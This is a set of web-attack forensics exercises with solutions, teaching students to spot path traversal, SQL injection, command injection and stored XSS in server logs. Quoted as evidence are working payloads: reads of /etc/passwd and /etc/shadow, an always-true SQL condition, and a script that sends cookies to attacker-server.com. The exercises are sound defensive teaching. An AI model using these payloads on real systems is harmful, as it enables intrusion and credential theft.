# Web Attack Forensics Challenges

This document provides practical exercises for a computer forensics class, focusing on identifying evidence of web-based attacks from log files.

## Very Basic: Path Traversal

**Objective:** Analyze a web server access log to find evidence of a path traversal attack.

### Student Instructions

You are given a web server log file, `access.log`. An attacker has attempted to access a sensitive file on the server. Your task is to identify which file the attacker tried to read.

**Hints:**
- Path traversal attacks use `../` sequences to navigate outside of the intended web root directory.
- Look for unusual requests that don't follow the normal application paths.

### Solution

The simplest way to find the attack is to search for the traversal sequence `../` in the log file.

```bash
grep "../" access.log
```

This command will highlight the malicious line:
`10.0.0.5 - - [10/Oct/2023:10:02:15 +0000] "GET /images/../../../../etc/passwd HTTP/1.1" 200 1121`

From this, you can see the attacker attempted to access the `/etc/passwd` file.

---

## Basic: SQL Injection (SQLi)

**Objective:** Identify a SQL injection payload within URL parameters in a web server log.

### Instructions

You are analyzing `access.log`. An attacker tried to bypass authentication or extract data using SQL injection. Your task is to find the exact payload they used.

**Assets:***Hints:**
- SQL injection attacks often include SQL keywords like `OR`, `UNION`, `SELECT`, or characters like `'` and `--`.
- Payloads in URLs are almost always URL-encoded. `%27` is the code for a single quote (`'`) and `%20` is the code for a space.

### Solution

First, search for common SQL keywords or characters. Searching for the URL-encoded single quote (`%27`) is a good starting point.

```bash
grep "%27" access.log
```

This returns the line:
`10.1.1.8 - - [12/Nov/2023:14:31:30 +0000] "GET /users.php?id=105%27%20OR%20%271%27=%271 HTTP/1.1" 200 800`

To understand the payload, you need to URL-decode it. You can do this with Python:

```python
python3 -c "from urllib.parse import unquote; print(unquote('105%27%20OR%20%271%27=%271'))"
```

The decoded payload is: `105' OR '1'='1`.

---

## Intermediate: Command Injection

**Objective:** Detect a command injection attack and identify the command the attacker executed.

### Student Instructions

You are given `access.log`. The server hosts a `ping.php` script that allows users to ping an IP address. An attacker has exploited this script to run an unauthorized command on the server. Find out what command they executed.

**Hints:**
- Command injection attacks use shell metacharacters to chain commands together. Common examples are `;`, `&&`, `|`, and `||`.
- These characters will be URL-encoded in the log file. The semicolon (`;`) is encoded as `%3b`.

### 3. Solution

Search for the URL-encoded semicolon (`%3b`) to find the malicious request.

```bash
grep "%3b" access.log
```

This gives you the line:
`10.2.2.9 - - [15/Dec/2023:11:06:00 +0000] "GET /tools/ping.php?host=8.8.8.8%3b%20cat%20/etc/shadow HTTP/1.1" 200 250`

Now, URL-decode the payload to see the full command:

```python
python3 -c "from urllib.parse import unquote; print(unquote('8.8.8.8%3b%20cat%20/etc/shadow'))"
```

The decoded command is `8.8.8.8; cat /etc/shadow`. The injected command is `cat /etc/shadow`.

---

## Advanced: Stored XSS and Cookie Theft

**Objective:** Trace a stored Cross-Site Scripting (XSS) attack from the initial injection to the final exfiltration of a user's cookie by analyzing two different log files.

### Student Instructions

An admin's session cookie was stolen. You are given two log files: `victim_server.log` from the application server and `attacker_server.log` from a server controlled by the attacker. Your task is to trace the attack and determine the value of the stolen cookie.

**Hints:**
- This is a multi-stage attack. First, find out how the attack was planted (the injection). Then, see how the data was stolen (the exfiltration).
- Look for `<script>` tags in the victim's log. This is the stored XSS payload.
- Analyze the script to see what it does. It sends data to `attacker-server.com`.
- Look in the attacker's log for the incoming request from the victim.

### 3. Solution

**Step 1: Find the XSS payload in the victim's log.**

Search for `<script>` in `victim_server.log`.

```bash
grep "<script>" victim_server.log
```

This reveals the malicious POST data:
`"comment=<script>document.location='http://attacker-server.com/steal.gif?c='+document.cookie;</script>"`

This script steals the `document.cookie` and sends it to `http://attacker-server.com/steal.gif` as a query parameter `c`.

**Step 2: Find the stolen cookie in the attacker's log.**

Now, look at `attacker_server.log` for the request to `steal.gif`.

```bash
grep "/steal.gif" attacker_server.log
```

This returns the line:
`192.168.1.1 - - [20/Jan/2024:18:10:01 +0000] "GET /steal.gif?c=sessionid=aBcDeFgHiJkLmNoPqRsTuVwXyZ HTTP/1.1" 200 1`

The IP address `192.168.1.1` matches the admin who viewed the page in the victim log. The stolen cookie is the value of the `c` parameter: `sessionid=aBcDeFgHiJkLmNoPqRsTuVwXyZ`.
